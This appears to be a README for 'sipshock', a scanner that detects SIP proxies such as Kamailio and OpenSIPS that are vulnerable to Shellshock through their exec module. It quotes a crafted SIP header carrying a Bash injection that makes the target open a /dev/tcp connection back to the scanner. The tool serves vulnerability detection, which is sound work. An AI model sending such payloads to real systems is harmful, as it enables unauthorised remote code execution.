### A scanner for SIP proxies vulnerable to Shellshock
---

#### Usage:
sipshock [ Flags ] [ IP Addresses ]

#### Usage flags:
- lhost : Local listening address
- lport  : Local listening port (default 10111)
- rport  : Remote port (default 5060)

The exec module in Kamailio, Opensips and propably every other SER fork
passes the received SIP headers as environment variables to the invoking shell.
This makes these SIP proxies vulnerable to CVE-2014-6271 (Bash Shellshock).
If a proxy is using any of the exec funtions and has the 'setvars' parameter set to the default value '1'
then by sending SIP messages containing a specially crafted header we can run arbitrary code on the
proxy machine.

Sipshock tries to detect such vulnerable proxies by sending SIP INVITE Messages
containing the following header: "X-Ploit: () { :;};exec >/dev/tcp/xx.xx.xx.xx/yy"
where xx.xx.xx.xx/yy is the local IP and port that sipshock listens to.
A vulnerable server will invoke a shell that will execute the code above and
open a tcp connection to xx.xx.xx.xx:yy. Sipshock detects the connection and
lists the server as vulnerable.

This program is free software, distributed under the terms of
the GNU General Public License Version 3. See the LICENSE file
at the top of the source tree.
